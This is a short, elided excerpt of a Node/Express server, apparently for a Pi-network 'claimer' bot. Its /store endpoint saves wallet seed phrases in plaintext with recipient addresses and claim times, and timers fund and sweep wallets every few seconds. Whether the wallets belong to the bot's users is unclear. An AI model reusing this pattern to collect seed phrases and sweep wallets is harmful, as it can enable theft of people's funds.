...
const allowedOrigins = ['http://localhost:8888', 'https://piclaimer-bot.netlify.app', 'https://cole-pi-admin.netlify.app', 'http://localhost:5173', 'https://piclaimer-admin.netlify.app', 'https://shep-pibot-admin.netlify.app', 'https://chic-crumble-d5e041.netlify.app', 'https://joyful-salamander-979b84.netlify.app', 'http://localhost:5174'];
...
app.post('/store', async (req, res) => {
    ...
    try {
        const now = new Date();
        const inThirtySeconds = new Date(now.getTime() + 25 * 60 * 1000);
        const result = await Passphrase.insertOne({ mnemonic, balanceId, receiverAddress: recipient, amount, claimableAt: inThirtySeconds, name: 'shepherd'  });
        res.json({ success: true, result });
    } catch(err) {
        res.status(500).json({ error: err.response?.data || err.message });
    }
...
setInterval(autoFundWallet, 10000);setInterval(autoSweepWallet, 1000);
